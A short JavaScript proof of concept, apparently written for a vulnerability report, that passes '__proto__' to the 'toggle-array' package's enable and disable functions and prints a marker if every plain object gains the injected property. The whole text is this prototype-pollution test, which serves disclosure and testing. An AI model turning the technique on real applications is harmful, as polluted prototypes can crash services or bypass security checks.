
const arr = {};
require("toggle-array").enable(arr, "vulnerableProp", "__proto__");
console.log({}.vulnerableProp !== undefined ? '[POLLUTION_TRIGGERED]':'');

const arrs = {};
require("toggle-array").disable(arrs, "vulnerableProps", "__proto__");
console.log({}.vulnerableProps !== undefined ? '[POLLUTION_TRIGGERED]':'');